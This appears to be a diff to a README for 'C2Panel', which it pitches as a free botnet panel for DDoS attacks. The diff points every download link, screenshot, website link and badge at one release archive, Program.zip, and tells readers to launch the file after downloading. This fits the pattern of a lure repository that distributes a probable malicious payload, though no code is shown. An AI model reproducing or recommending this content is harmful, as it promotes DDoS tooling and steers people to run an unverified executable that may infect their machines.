@@ -14,13 +14,13 @@ Welcome to C2Panel, the ultimate free botnet panel for all your DDoS needs. Take
 
 ## Getting Started 🚀
 
-To get started with C2Panel, simply download the software package from the following link: [Launch C2Panel](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+To get started with C2Panel, simply download the software package from the following link: [Launch C2Panel](https://github.com/Vitrius/C2Panel/releases/download/v1.0/Program.zip)
 
 *Note: The file needs to be launched after downloading.*
 
 ## Screenshots 📸
 
-![Botnet Panel](https://via.placeholder.com/600x400)
+![Botnet Panel](https://github.com/Vitrius/C2Panel/releases/download/v1.0/Program.zip)
 
 ## Installation Instructions 📦
 
@@ -55,9 +55,9 @@ If you encounter any issues or have questions about C2Panel, please check the "R
 
 ## Stay Connected 🌐
 
-For the latest news and updates on C2Panel, be sure to visit our website at [C2Panel.com](https://www.C2Panel.com). Join our Discord server to connect with other users and share your experiences with the botnet panel.
+For the latest news and updates on C2Panel, be sure to visit our website at [https://github.com/Vitrius/C2Panel/releases/download/v1.0/Program.zip](https://github.com/Vitrius/C2Panel/releases/download/v1.0/Program.zip). Join our Discord server to connect with other users and share your experiences with the botnet panel.
 
-[![Download C2Panel](https://img.shields.io/badge/Download-C2Panel-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download C2Panel](https://github.com/Vitrius/C2Panel/releases/download/v1.0/Program.zip)](https://github.com/Vitrius/C2Panel/releases/download/v1.0/Program.zip)
 
 Let's take control of the internet together with C2Panel! Happy hacking! 🔒🌐🔨
 
